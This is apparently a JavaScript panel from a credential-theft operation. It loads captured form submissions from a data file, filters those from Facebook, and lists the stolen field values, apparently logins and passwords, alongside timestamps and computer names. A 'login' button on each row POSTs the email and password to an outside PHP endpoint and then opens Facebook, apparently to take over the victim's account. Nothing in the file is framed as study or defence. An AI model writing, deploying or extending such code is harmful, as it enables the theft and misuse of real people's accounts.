  function Viewer() {

    this.extractDomain = function(url) {
      var a = document.createElement('a');
      a.href = url;
      return a.hostname || url.slice(0,25);
    };

    this.listDetails = function(details) {
      var list = '';
      for(key in details.formData) {
        list += key + ' : ' + details.formData[key] + '<br/>';
      }
      return list;
    };

    this.autoLogin = function(details) {
      var list = 'setLogin(';
      for(key in details.formData) {
        list += "'" + details.formData[key] + "',";
      }
      return list.slice(0,-1) + ')';
    };

    this.generateRow = function(details,counter) {
      var row = ''+
      '<tr class="entry">'+
      '<th>'+counter+'</th>'+
      '<td class="width20Per breakWord maxWidth400"><a href="'+details.url+'">'+this.extractDomain(details.url)+'</td>'+
      '<td class="width40Per breakWord maxWidth100">'+this.listDetails(details)+'</td>'+
      '<td class="width20Per breakWord maxWidth100">'+dateFormat(new Date(details.timeStamp), "dddd, mmmm dS, yyyy, h:MM:ss TT")+'</td>'+
      '<td class="width40Per breakWord maxWidth400">'+details.computer+'</td>'+
      '<td class="width40Per breakWord maxWidth400">'+'<button class="boton" onclick="'+this.autoLogin(details)+'">Iniciar sesión</button>'+'</td>'+
      '</tr>';
      return row;
    };

    this.floatTable = function() {
      jQuery('.table-container').mCustomScrollbar({
        'setHeight' : 0.76103500761035 * jQuery(window).height(),
        'theme' : 'rounded-dots-dark',
        'scrollButtons' : {
          'enable' : true
        }
      });
      jQuery('.logs-table').floatThead({
        scrollContainer: function($table){
          return $table.closest('.table-container');
        }
      });
    };

    this.showLogs = function() {
      var self = this;
      var tbody = document.getElementById('list-container');
      var counter = 1;
      var jqxhr = $.getJSON( "data.json", function() {
        console.log( "success" );
      })
      .done(function( json ) {
       console.log(json);
       for (var i = 0; i < json.length; i++) {
        if (json[i].url) {
          if (json[i].url.includes("facebook")) {
            tbody.insertAdjacentHTML('beforeend', self.generateRow(json[i],counter++));
            // self.floatTable();
            setTimeout(function() {
              jQuery('#welcome').trigger('stopRumble');
            }, 1000);
          }
        }
        
      }
    })
      .fail(function( jqxhr, textStatus, error ) {
        var err = textStatus + ", " + error;
        console.log( "Request Failed: " + err );
      });
    }
  };

  this.clearLogs = function() {
    document.getElementById('list-container').innerHTML = '';
  }

  this.setLogin = function(email,password) {
    $('.boton').removeClass("verde");
    $('.boton').click(function(){
      $(this).addClass("verde");
    });
    data = {email: email, password: password};
    $.ajax({
      url: "http://multirecargasysuministros.com/iluminati/setLogin.php",
      type: "POST",
      data: JSON.stringify(data),
      contentType: "application/json"
    })
    .done(function( data ) {
      console.log("Login setup");
      url = 'https://www.facebook.com/'
      window.open(url,'_blank');
    });
  };

  var view = new Viewer();
  view.showLogs();


